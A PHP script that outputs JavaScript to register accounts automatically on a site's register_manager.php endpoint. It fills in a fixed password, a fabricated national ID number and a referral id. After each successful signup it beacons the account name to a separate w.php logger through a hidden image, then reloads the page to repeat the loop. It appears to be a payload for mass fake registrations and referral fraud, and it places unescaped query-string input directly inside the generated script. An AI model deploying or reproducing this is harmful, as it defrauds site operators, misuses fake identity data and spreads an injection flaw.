<?php
header("Content-type: text/javascript");

$account = $_GET["account"];

echo "$.ajax({";
echo "	type:'POST',";
echo "	url:'/users/register_manager.php?action=save',";
echo "	dataType:'json',";
echo "	data:{";
echo "		'login_account' : '" . $account ."',";
echo "		'password' : '123456',";
echo "		'password1' : '123456',";
echo "		'email' : 'honingwon@gmail.com',";
echo "		'username' : '我勒个去',";
echo "		'id_card_number' : '110101196501012857',";
echo "		'refer' : 195,";
echo "		'adrefer' : '',";
echo "		'callback' : ''";
echo "	},";
echo "	success:function(json) {";
echo "		if(json.ret=='true'){";
echo "			console.log('MES_REG_SUC');";
echo "			var href = 'http://127.0.0.1/honingwon/snippets/php/37csjz/w.php?account=' + '" . $account . "';";
echo "			$('body').append('<img src=\'' + href + '\' />');";
echo "			setTimeout(function(){";
echo "				window.location.reload();";
echo "			},1000);";
echo "		}";
echo "	}";
echo "});";
?>